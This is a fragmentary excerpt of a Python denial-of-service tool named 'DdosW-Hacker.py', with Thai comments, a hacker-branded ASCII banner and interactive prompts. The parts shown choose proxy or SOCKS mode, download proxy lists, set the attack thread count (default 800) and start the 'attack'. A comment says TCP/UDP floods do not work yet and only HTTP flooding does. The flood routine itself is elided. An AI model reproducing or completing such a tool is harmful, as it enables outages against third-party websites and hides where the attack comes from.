...
try: # ตั้งค่าสำหรับ Linux
	...
	print ("TCP/UDP FLOOD ไม่สนับสนุนใต้ระบบนี้. คุณต้องใช้ HTTP FLOOD.") # ตัวนี้ยิงได้แค่ HTTP นะยังไม่แก้เรื่อง UDP TCP เลยนะ
...
======================================================================================================= 
 ...
 ██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  
 By Weir MO (W-Hacker) ツwow great  555555+ อันนี้ไม่ได้ทำเองเอามาดัดแปลง
======================================================================================================= 
#######################################################################################################
|Version : V.1.0
            |
|Create  : 7/07/64          |
########################################################################################################
	usage : python3 DdosW-Hacker.py Wongsakorn
=================================================================================================== \033[91m''')
...
def choiceproxysocks():
	global choice3
	choice3 = input("พิมพ์ '0' เพื่อเปิด พร็อกซี่โหมด หรือ พิมพ์ '1' เพื่อเปิด ซ็อคโหมด: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("คุณพิมพ์ผิด โปรดลองใหม่อีกครั้ง.")
		choiceproxysocks()
...
def choicedownsocks():
	choice4 = input("คุณต้องการดาวโหลดรายการพร็อกซี่ใหม่หรือไม่ พิมพ์ 'y' เพื่อดำเนินต่อ: ")
	if choice4 == "y":
...
def proxyget(urlproxy): # ชื่อบอกว่ามันฟังก์ชั่นนี้ดาวน์โหลดพร็อกซี
	try:
		...
		out_file.close()
		print ("พร็อกซี่ ดาวโหลด ประสบความสำเร็จ.")
...
def numthreads():
	global threads
	try:
		threads = int(input("ใส่จำนวนเธรด (800): "))
	except ValueError:
		threads = 800
...
def begin():
	choice6 = input("Enter To Start Attack By W-Hacker: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": 
		loop()
